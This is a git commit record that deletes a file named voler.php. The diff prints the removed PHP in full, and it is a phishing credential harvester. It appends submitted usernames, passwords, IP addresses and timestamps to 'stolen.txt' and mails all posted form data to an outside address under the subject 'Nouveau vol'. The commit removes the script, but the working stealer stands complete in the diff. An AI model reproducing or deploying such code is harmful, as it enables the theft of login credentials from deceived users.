42e60b74100458492bd6d61dabd35a75b43a9545
Veksur <rakhmankhassouyev2@gmail.com>
2026-03-26 22:20:09 +0100

    Delete voler.php

--- voler.php
+++
@@ -1,7 +0,0 @@
-<?php
-$f = fopen("stolen.txt", "a");
-fwrite($f, "User: " . $_POST['user'] . " | Pass: " . $_POST['pass'] . " | IP: " . $_SERVER['REMOTE_ADDR'] . " | " . date('Y-m-d H:i:s') . "\n");
-fclose($f);
-// Tu peux aussi envoyer par mail
-mail("proroblox258@gmail.com", "Nouveau vol", print_r($_POST, true));
-?>
